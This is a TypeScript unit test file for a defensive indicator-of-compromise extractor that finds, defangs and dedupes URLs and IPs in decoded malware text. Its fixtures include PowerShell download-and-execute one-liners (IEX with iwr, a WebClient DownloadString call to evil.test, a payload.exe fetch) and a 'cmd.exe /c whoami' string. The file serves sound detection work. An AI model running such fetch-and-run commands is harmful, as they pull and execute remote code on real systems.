// shared/analyzer/__tests__/extract.test.ts
import { describe, expect, it } from 'vitest'
import { extractIocs } from '../extract'

describe('extractIocs', () => {
  it('pulls URLs + IPs from decoded text, defanged, with layer provenance', () => {
    const iocs = extractIocs([
      { index: 0, text: "IEX (iwr 'http://45.9.148.20/a.ps1')" },
      { index: 1, text: 'connect 185.220.101.42' },
    ])
    const raws = iocs.map((i) => i.raw)
    expect(raws).toContain('http://45.9.148.20/a.ps1')
    expect(raws).toContain('185.220.101.42')
    const url = iocs.find((i) => i.raw.startsWith('http'))!
    expect(url.type).toBe('url')
    expect(url.defanged).toBe('hxxp://45[.]9[.]148[.]20/a[.]ps1')
    expect(url.layerIndex).toBe(0)
  })

  it('dedupes an IOC that appears in multiple layers (keeps the first)', () => {
    const iocs = extractIocs([
      { index: 0, text: 'http://a.test/x' },
      { index: 1, text: 'http://a.test/x' },
    ])
    expect(iocs.filter((i) => i.raw === 'http://a.test/x')).toHaveLength(1)
    expect(iocs[0].layerIndex).toBe(0)
  })

  it('does not extract .NET member-access tokens as domains', () => {
    const iocs = extractIocs([
      { index: 0, text: "$wc = New-Object Net.WebClient; $wc.DownloadString('http://evil.test/x')" },
    ])
    const raws = iocs.map((i) => i.raw)
    expect(raws).toContain('http://evil.test/x')  // the real URL is kept
    expect(raws).not.toContain('Net.WebClient')    // PascalCase member dropped
    expect(raws).not.toContain('wc.DownloadString')
  })

  it('does not extract binary filenames (cmd.exe, kernel32.dll, amsi.dll) as domain IOCs', () => {
    const iocs = extractIocs([
      { index: 0, text: 'cmd.exe /c whoami & kernel32.dll amsi.dll' },
    ])
    const raws = iocs.map((i) => i.raw)
    expect(raws).not.toContain('cmd.exe')
    expect(raws).not.toContain('kernel32.dll')
    expect(raws).not.toContain('amsi.dll')
  })

  it('still extracts a URL that ends in a denylisted extension (the denylist only guards the domain branch)', () => {
    const iocs = extractIocs([
      { index: 0, text: "IEX (iwr 'http://evil.test/payload.exe')" },
    ])
    expect(iocs.map((i) => i.raw)).toContain('http://evil.test/payload.exe')
  })
})
